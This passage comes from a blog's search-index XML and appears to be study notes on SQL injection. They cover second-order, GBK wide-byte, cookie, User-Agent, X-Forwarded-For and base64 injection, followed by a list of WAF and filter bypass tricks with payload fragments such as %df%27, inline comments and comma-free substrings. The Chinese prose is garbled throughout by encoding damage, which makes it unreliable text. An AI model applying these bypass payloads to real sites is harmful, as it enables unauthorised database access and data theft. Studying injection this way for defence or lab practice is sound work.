â€“+)å³ä¸ºæ—¶é—´ç›²æ³¨çš„è¯­å¥</li><li>ä½¿ç”¨PDOæ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œå¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œä¸è¿‡è¿™æ ·é€šå¸¸ä¸èƒ½ç›´æ¥å¾—åˆ°æ³¨å…¥ç»“æœï¼Œå› ä¸ºPDOåªä¼šè¿”å›ç¬¬ä¸€æ¡SQLè¯­å¥æ‰§è¡Œçš„ç»“æœï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­å¯ä»¥ç”¨updateæ›´æ–°æ•°æ®æˆ–è€…ä½¿ç”¨æ—¶é—´ç›²æ³¨è·å–æ•°æ®</li></ul><h3 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h3><ul><li><p>é€‚ç”¨<code> æ³¨å…¥æ¼æ´é¡µé¢ä¸æŸ¥è¯¢é¡µé¢ä¸åœ¨åŒä¸€é¡µé¢</code></p></li><li><p>æ¯”æ–¹è¯´1.phpå¯ä»¥æ’å…¥sqlè¯­å¥ï¼Œ2.phpå¯ä»¥é€šè¿‡å‚æ•°IDè¯»å–ç”¨æˆ·åå’Œç”¨æˆ·ä¿¡æ¯ã€‚</p></li><li><p>æ€è·¯å¤§ä½“å°±æ˜¯åœ¨å¤šä¸ªé¡µé¢ä¸­æ‰¾åˆ°é‚£ä¸ªè¿‡æ»¤æªæ–½ä¸ä¸¥å¯†çš„ç½‘ç«™ä½œä¸ºçªç ´å£ï¼Œä»è€Œè¾¾æˆè‡ªå·±çš„æ³¨å…¥ç›®çš„ã€‚</p></li></ul><h3 id="å®½å­—èŠ‚æ³¨å…¥ï¼ˆGBKåŒå­—èŠ‚ç»•è¿‡ï¼‰"><a href="#å®½å­—èŠ‚æ³¨å…¥ï¼ˆGBKåŒå­—èŠ‚ç»•è¿‡ï¼‰" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥ï¼ˆGBKåŒå­—èŠ‚ç»•è¿‡ï¼‰"></a>å®½å­—èŠ‚æ³¨å…¥ï¼ˆGBKåŒå­—èŠ‚ç»•è¿‡ï¼‰</h3><ul><li><p>é€‚ç”¨ï¼š<br><code>å•å¼•å·è¢«åæ–œæ è½¬ä¹‰ï¼Œä¸”æ•°æ®åº“ç¼–ç ä¸ºGBKï¼ˆPHPä¸­é€šè¿‡iconv()è¿›è¡Œç¼–ç è½¬æ¢ä¹Ÿå¯èƒ½å­˜åœ¨å®½å­—èŠ‚å­—ç¬¦æ³¨å…¥ï¼‰</code></p></li><li><p>å®½å­—èŠ‚æ ¼å¼ï¼šå…ˆåŠ  <code>%df</code> å†åŠ <code>&#39;</code></p></li><li><p>åŸç†ï¼š<br><code>åæ–œæ ç¼–ç æ˜¯%5cï¼ŒGBKç¼–ç ä¸­%df%5cè¡¨ç¤ºä¸ºä¸€ä¸ªç¹ä½“å­—â€™é‹â€˜ï¼Œä»è€Œç»•è¿‡åæ–œæ ã€‚ï¼ˆä¸ä»…ä»…å¯ä»¥é€‚ç”¨%df%5c,å‡¡æ˜¯èƒ½æ„é€ æˆGBKåŒå­—èŠ‚çš„éƒ½èƒ½äº§ç”Ÿè¿™æ ·çš„ç»•è¿‡æ•ˆæœï¼‰</code></p></li><li><p>æ¯”å¦‚è¾“å…¥çš„idè¢« <code>&#39;</code>åŒ…å›´ï¼Œè¾“å…¥<code>id=1&#39;</code>ï¼Œç¨‹åºä¸æŠ¥é”™ï¼Œä½†ä¼šå¤šå‡ºä¸€ä¸ªåæ–œæ (<code>id= &#39;1\&#39;&#39;</code>)ï¼Œæ­¤æ—¶è¾“å…¥çš„å•å¼•å·è¢«åæ–œæ è½¬ä¹‰ï¼Œä»è€Œå¯¼è‡´è¾“å…¥çš„å•å¼•å·æ— æ³•å½¢æˆé—­åˆã€‚é€šå¸¸è¿™ç§æƒ…å†µä¸‹æ­¤å¤„æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ã€‚<br>ä½†æ•°æ®åº“æŸ¥è¯¢å‰æ‰§è¡Œäº†SET NAMES â€˜GBKâ€™è¯­å¥ï¼Œä¼šå°†ç¼–ç è®¾ç½®ä¸ºå®½å­—èŠ‚GBKã€‚é€ æˆæ­¤å¤„çš„å®½å­—èŠ‚æ¼æ´ã€‚</p></li></ul><h3 id="cookieæ³¨å…¥"><a href="#cookieæ³¨å…¥" class="headerlink" title="cookieæ³¨å…¥"></a>cookieæ³¨å…¥</h3><ul><li>é€‚ç”¨ï¼š<br><code>URLä¸­æ²¡æœ‰GETå‚æ•°ï¼Œä½†é¡µé¢è¿”å›æ­£å¸¸ã€‚æŠ“åŒ…å‘ç°cookieä¸­å­˜åœ¨iç±»ä¼¼d=1çš„å‚æ•°ã€‚(å‚æ•°åä¸ä¸€å®šæ˜¯idï¼Œä¹Ÿå¯èƒ½æ˜¯unameç­‰ç­‰)</code></li><li>åŸç†ï¼š<br><code>ç¨‹åºé€šè¿‡$_COOKIEè·å–å‚æ•°IDï¼Œç„¶åå°†IDæ‹¼æ¥åˆ°selectè¯­å¥ä¸­æŸ¥è¯¢ã€‚è‹¥ä¸å¯¹cookieä¸­çš„å‚æ•°idè¿›è¡Œè¿‡æ»¤å°±ä¼šå­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚</code></li><li>å’ŒåŸºäºGETçš„urlæ³¨å…¥å¥—è·¯ç›¸ä¼¼ã€‚</li></ul><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><ul><li>é€‚ç”¨ï¼š<br><code>å‚æ•°å‡ºç°åœ¨User-Agentä¿¡æ¯ä¸­ã€‚</code></li><li>å°†æ„é€ çš„è¯­å¥æ”¾åœ¨User-Agentä¿¡æ¯çš„æœ«å°¾å³å¯</li></ul><h3 id="XFFæ³¨å…¥"><a href="#XFFæ³¨å…¥" class="headerlink" title="XFFæ³¨å…¥"></a>XFFæ³¨å…¥</h3><ul><li>é€‚ç”¨ï¼š<br><code>å‚æ•°å‡ºç°åœ¨X-Forwarded-forä¸­ã€‚(ç®€ç§°XFFå¤´ï¼Œä»£è¡¨å®¢æˆ·ç«¯çš„çœŸå®IPï¼Œä¿®æ”¹è¿™ä¸ªå€¼å¯ä»¥ä¼ªé€ å®¢æˆ·ç«¯IP)</code></li><li>æ£€æµ‹åŠåˆ©ç”¨ï¼š<br><code>å°†XFFè®¾ç½®ä¸º127.0.0.1ï¼Œè®¿é—®è¯¥URLé¡µé¢æ­£å¸¸ï¼Œæ”¹ä¸º127.0.0.1â€™ è¿”å›æŠ¥é”™ä¿¡æ¯åˆ™å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</code><br><code> unionè”åˆæŸ¥è¯¢æ³¨å…¥å³å¯ã€‚</code></li></ul><h3 id="base64æ³¨å…¥"><a href="#base64æ³¨å…¥" class="headerlink" title="base64æ³¨å…¥"></a>base64æ³¨å…¥</h3><ul><li>é€‚ç”¨ï¼š<br><code>è§‚å¯Ÿè¯·æ±‚æ•°æ®ä¸­æœ‰å‡ºç°å¤§å°å†™å­—æ¯+æ•°å­—çš„ç»„åˆä¹±ç ã€‚</code></li><li>åˆ©ç”¨ï¼š<br><code>æ³¨å…¥æ—¶å…ˆå°†åŸæ¥çš„base64è§£ç ï¼Œä¸æ„é€ çš„è¯­å¥æ‹¼æ¥ï¼Œä¸€èµ·è¿›è¡Œbase64ç¼–ç åå°†æ•°æ®å‘é€å³å¯</code></li><li>åŸç†ï¼š<br><code>åç«¯ä¼šåˆ©ç”¨å‡½æ•°base64_decode()å¯¹å‚æ•°IDè¿›è¡Œbase64è§£ç ï¼Œåœ¨å°†è§£ç åçš„idä¿¡æ¯æ‹¼æ¥åˆ°selectè¯­å¥æŸ¥è¯¢ã€‚å› ä¸ºç¨‹åºæœªå¯¹è§£ç åçš„idè¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚</code></li></ul><h1 id="SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"><a href="#SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"></a>SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯</h1><ul><li>åœ¨ä»£ç å±‚çš„é˜²å¾¡ä¸€èˆ¬ä¸å¤–ä¹ä¸¤ç§ï¼Œä¸€æ˜¯åæ–œæ è½¬ä¹‰ï¼ŒäºŒæ˜¯replaceå°†å…³é”®å­—æ›¿æ¢æˆç©ºå­—èŠ‚</li></ul><h2 id="å¤§å°å†™ç»•è¿‡æ³¨å…¥"><a href="#å¤§å°å†™ç»•è¿‡æ³¨å…¥" class="headerlink" title="å¤§å°å†™ç»•è¿‡æ³¨å…¥"></a>å¤§å°å†™ç»•è¿‡æ³¨å…¥</h2><ul><li>é€‚ç”¨ï¼š<br><code>å¯èƒ½å­˜åœ¨andã€selectã€unionè¿™æ ·çš„å…³é”®å­—è¢«æ›¿æ¢çš„æƒ…å†µï¼Œåˆ™å¯ä»¥é‡‡ç”¨å¤§å°å†™ç»•è¿‡è¿›è¡Œæ³¨å…¥</code></li><li>eg:<code>and-&gt;Andã€aNdã€ANDç­‰ç­‰</code></li></ul><h2 id="åŒå†™ç»•è¿‡æ³¨å…¥"><a href="#åŒå†™ç»•è¿‡æ³¨å…¥" class="headerlink" title="åŒå†™ç»•è¿‡æ³¨å…¥"></a>åŒå†™ç»•è¿‡æ³¨å…¥</h2><ul><li>é€‚ç”¨æƒ…å†µåŒä¸Š</li><li>eg:<code>and-&gt;anandd</code>ã€<code>or-&gt;oorr</code> ç­‰ç­‰</li></ul><h2 id="ç¼–ç ç»•è¿‡æ³¨å…¥"><a href="#ç¼–ç ç»•è¿‡æ³¨å…¥" class="headerlink" title="ç¼–ç ç»•è¿‡æ³¨å…¥"></a>ç¼–ç ç»•è¿‡æ³¨å…¥</h2><ul><li><p>åªéœ€åˆ¤æ–­è¢«è¿‡æ»¤çš„å…³é”®å­—ï¼Œå¹¶ç»è¿‡ä¸¤æ¬¡URLå…¨ç¼–ç å³å¯ã€‚å…¶ä½™ä¸unionæ³¨å…¥ä¸€æ ·ã€‚</p></li><li><p>æœåŠ¡å™¨ä¼šå­—æ®µå¯¹URLè¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œæ‰€ä»¥è¦æŠŠå…³é”®è¯ç¼–ç ä¸¤æ¬¡ã€‚<br>æ³¨ï¼šæ­¤å¤„URLç¼–ç è¦é€‰æ‹©å…¨ç¼–ç </p></li><li><p>åŸç†ï¼š<br><code>æœåŠ¡å™¨ä¼šè¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œä½†åç»­çš„è¿›ç¨‹å¦‚æœåŠ¡å™¨ã€ç¨‹åºå‡½æ•°ç­‰ç­‰è§£ç å¹¶ä¸ç»Ÿä¸€ï¼Œæ”»å‡»è€…å°±æ˜¯åˆ©ç”¨æ­¤å¤„çš„ä¸ç»Ÿä¸€å°†å…³é”®å­—åœ¨è¿‡æ»¤å‡ºè¿›è¡Œç¼–ç ç»•è¿‡ï¼Œå†åœ¨éšåçš„è§£ç æ­¥éª¤è§£ç è¿˜åŸã€‚</code>ï¼š<img src="https://i.loli.net/2021/02/13/iWvGmyjHk5Y27UC.jpg" alt="å›¾ç‰‡æºè‡ªç½‘æ˜“Webå®‰å…¨å·¥ç¨‹å¸ˆè¯¾ç¨‹ï¼Œä¾µåˆ "></p></li></ul><h2 id="å†…è”æ³¨é‡Šç»•è¿‡æ³¨å…¥"><a href="#å†…è”æ³¨é‡Šç»•è¿‡æ³¨å…¥" class="headerlink" title="å†…è”æ³¨é‡Šç»•è¿‡æ³¨å…¥"></a>å†…è”æ³¨é‡Šç»•è¿‡æ³¨å…¥</h2><ul><li>å°†è¢«è¿‡æ»¤çš„å…³é”®å­—ç”¨<code>/*ï¼*/</code>åŒ…èµ·æ¥å³å¯ã€‚</li><li>åŸç†ï¼š<br>åœ¨mysqlä¸­ï¼Œå†…è”æ³¨é‡Š<code>/*ï¼code */</code>ä¸­çš„codeè™½ç„¶è¢«æ³¨é‡Šäº†ä½†ä»èƒ½å‘æŒ¥å…¶åœ¨è¯­å¥ä¸­çš„ä½œç”¨ã€‚</li></ul><h2 id="ç‰¹æ®Šç¬¦å·ç»•è¿‡"><a href="#ç‰¹æ®Šç¬¦å·ç»•è¿‡" class="headerlink" title="ç‰¹æ®Šç¬¦å·ç»•è¿‡"></a>ç‰¹æ®Šç¬¦å·ç»•è¿‡</h2><p>é™¤äº†ä»¥ä¸Šè¿™äº›ï¼Œæœ‰äº›wafä¹Ÿä¼šè¿‡æ»¤ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼šç©ºæ ¼ã€=ã€&lt;ã€&gt;ç­‰ç­‰<br>è¿™é‡Œçš„bypassæ–¹æ³•å®é™…å°±æ˜¯å¯»æ‰¾ç­‰æ•ˆçš„å‘½ä»¤ï¼Œæˆ–è€…ç”¨ç‰¹æ®Šçš„å§¿åŠ¿å®ç°ç»•è¿‡</p><h3 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡æ³¨å…¥"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡æ³¨å…¥" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡æ³¨å…¥"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡æ³¨å…¥</h3><ul><li>é€‚ç”¨äºç©ºæ ¼è¢«ç½®æ¢ä¸ºç©ºçš„æƒ…å†µï¼Œé™¤äº†sqlæ³¨å…¥ï¼Œå¾ˆå¤šåœ°æ–¹éƒ½æœ‰è¿™æ ·çš„WAF</li><li>bypassï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">()<br><span class="hljs-comment">/**/</span><br>å›è½¦(urlç¼–ç ä¸ºï¼š<span class="hljs-operator">%</span><span class="hljs-number">0</span>a)<br>`(åå¼•å·)<br>tap<br>åŒç©ºæ ¼<br></code></pre></td></tr></table></figure><h3 id="or-and-xor-notè¿‡æ»¤ç»•è¿‡"><a href="#or-and-xor-notè¿‡æ»¤ç»•è¿‡" class="headerlink" title="or and xor notè¿‡æ»¤ç»•è¿‡"></a>or and xor notè¿‡æ»¤ç»•è¿‡</h3><ul><li>bypass:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-operator">=</span> <span class="hljs-operator">&amp;&amp;</span><br><span class="hljs-keyword">or</span> <span class="hljs-operator">=</span> <span class="hljs-operator">||</span><br>xor <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> # å¼‚æˆ–<br><span class="hljs-keyword">not</span> <span class="hljs-operator">=</span> <span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure><h3 id="å·è¿‡æ»¤ç»•è¿‡"><a href="#å·è¿‡æ»¤ç»•è¿‡" class="headerlink" title="=å·è¿‡æ»¤ç»•è¿‡"></a>=å·è¿‡æ»¤ç»•è¿‡</h3><ul><li>bypass: </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä¸åŠ é€šé…ç¬¦`<span class="hljs-operator">%</span>`çš„`<span class="hljs-keyword">like</span>`å’Œ`relike`<br>`<span class="hljs-operator">!</span><span class="hljs-operator">&lt;&gt;</span>`<br>åˆ©ç”¨å…³é”®å­—`regexp`è¿›è¡Œæ­£åˆ™è¡¨è¾¾åŒ¹é…<br>åˆ©ç”¨æ¯”è¾ƒå‡½æ•°`strcmp(str1,str2)`<br></code></pre></td></tr></table></figure><ul><li>ä¸åŠ é€šé…ç¬¦<code>%</code>çš„<code>like</code>å’Œ<code>relike</code> (æ•ˆæœç­‰åŒäº=)</li></ul><p>ä¸åŠ é€šé…ç¬¦<code>%</code>çš„<code>like</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> id <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> test1    <span class="hljs-operator">|</span> pass1    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ é€šé…ç¬¦<code>%</code>çš„<code>like</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> &quot;test%&quot;;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> test1    <span class="hljs-operator">|</span> pass1    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> test3    <span class="hljs-operator">|</span> pass3    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br></code></pre></td></tr></table></figure><ul><li><code>!&lt;&gt;</code><br><code>&lt;&gt;</code>ç›¸å½“äº<code>!=</code>ï¼Œæ‰€æœ‰<code>!&lt;&gt;</code>å°±ç›¸å½“äº<code>=</code></li></ul><h3 id="lt-gt-è¿‡æ»¤ç»•è¿‡"><a href="#lt-gt-è¿‡æ»¤ç»•è¿‡" class="headerlink" title="&lt;&gt;è¿‡æ»¤ç»•è¿‡"></a>&lt;&gt;è¿‡æ»¤ç»•è¿‡</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">`greatest(n1, n2,â€¦)`:è¿”å›nä¸­çš„æœ€å¤§å€¼<br>`least(n1,n2,â€¦)`:è¿”å›nä¸­çš„æœ€å°å€¼<br>`strcmp(str1,str2)`:è‹¥æ‰€æœ‰çš„å­—ç¬¦ä¸²å‡ç›¸åŒï¼Œåˆ™è¿”å›STRCMP()ï¼Œè‹¥æ ¹æ®å½“å‰åˆ†ç±»æ¬¡åºï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°äºç¬¬äºŒä¸ªï¼Œåˆ™è¿”å› <span class="hljs-number">-1</span>ï¼Œå…¶å®ƒæƒ…å†µè¿”å› <span class="hljs-number">1</span><br>å…³é”®å­—`<span class="hljs-keyword">in</span>`<br></code></pre></td></tr></table></figure><h3 id="å¼•å·-å•ã€åŒ-è¿‡æ»¤ç»•éŸ©å›½"><a href="#å¼•å·-å•ã€åŒ-è¿‡æ»¤ç»•éŸ©å›½" class="headerlink" title="å¼•å·(å•ã€åŒ)è¿‡æ»¤ç»•éŸ©å›½"></a>å¼•å·(å•ã€åŒ)è¿‡æ»¤ç»•éŸ©å›½</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">å¼•å·è¿åŒå¼•å·å†…å†…å®¹ä¸€èµ·è½¬ä¸ºåå…­è¿›åˆ¶<br>å®½å­—èŠ‚ç»•è¿‡ï¼š<br>    # è¿‡æ»¤å•å¼•å·æ—¶<br>    <span class="hljs-operator">%</span>bf<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>aa<span class="hljs-operator">%</span><span class="hljs-number">27</span><br><span class="hljs-operator">%</span>df\â€™ <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">=</span>ç¸—â€™<br></code></pre></td></tr></table></figure><h3 id="ï¼Œè¿‡æ»¤ç»•è¿‡"><a href="#ï¼Œè¿‡æ»¤ç»•è¿‡" class="headerlink" title="ï¼Œè¿‡æ»¤ç»•è¿‡"></a>ï¼Œè¿‡æ»¤ç»•è¿‡</h3><ul><li>ï¼Œè¢«è¿‡æ»¤ä¼šå½±å“è®¸å¤šå‡½æ•°çš„ä½¿ç”¨,ç‰¹åˆ«æ˜¯ç›²æ³¨éœ€è¦ç”¨åˆ°å¾ˆå¤šå‡½æ•°éƒ½éœ€è¦é€—å·</li><li>bypassï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len<br><span class="hljs-keyword">join</span><br>å…³é”®å­— <span class="hljs-keyword">like</span>(æå–å­ä¸²çš„å‡½æ•°ä¸­çš„é€—å· <span class="hljs-keyword">select</span> ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>; <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;)<br>å…³é”®å­— <span class="hljs-keyword">offset</span>(limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len ä»£æ›¿ ï¼Œ<br>åŸæœ¬çš„substrå‡½æ•°ï¼š           <span class="hljs-keyword">select</span> substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>); <br>ç”¨<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> lenä»£æ›¿é€—å·ï¼š <span class="hljs-keyword">select</span> substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">åŸè¯­å¥ï¼š<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br><span class="hljs-keyword">join</span> ä»£æ›¿ ï¼Œï¼š<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c;<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°ç»•è¿‡"><a href="#å‡½æ•°ç»•è¿‡" class="headerlink" title="å‡½æ•°ç»•è¿‡"></a>å‡½æ•°ç»•è¿‡</h3><p>å®è´¨æ˜¯æ‰¾ç­‰ä»·å‡½æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark()<br>ascii() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ord()ã€hex()ã€bin() #ä¸ä¸€å®šç”¨asciiç ï¼Œä¹Ÿå¯è½¬ä¸ºå…¶ä»–è¿›åˆ¶ï¼›ä½†ord()äºascii()å¯¹ä¸­æ–‡å¤„ç†ä¸åŒ<br>group_concat() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> concat_ws()<br><span class="hljs-keyword">user</span>() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@user</span>  #å…¨å±€å˜é‡<br>datadir <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@datadir</span> #å…¨å±€å˜é‡<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sqlæ³¨å…¥</tag>
      
      <tag>æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
